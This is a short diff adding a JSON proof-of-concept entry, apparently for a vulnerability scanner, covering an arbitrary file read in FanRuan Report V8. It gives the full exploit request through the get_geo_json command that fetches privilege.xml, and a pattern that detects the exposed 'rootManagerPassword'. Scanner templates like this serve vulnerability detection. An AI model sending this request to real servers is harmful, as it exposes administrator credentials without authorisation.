@@ -1,0 +1,14 @@
+{
+	"name":"帆软报表V8get_geo_json任意文件读取",
+	"tag":"fanruan",
+	"type":"other",
+	"poc":{
+		"pocGet":"/WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml",
+		"header":{
+			"User-Agent":"Mozilla/5.0 (Linux;",
+			"content-type":"text/plain"
+		},
+		"status_code":"200",
+		"pattern":"(rootManagerPassword)"
+	}
+}
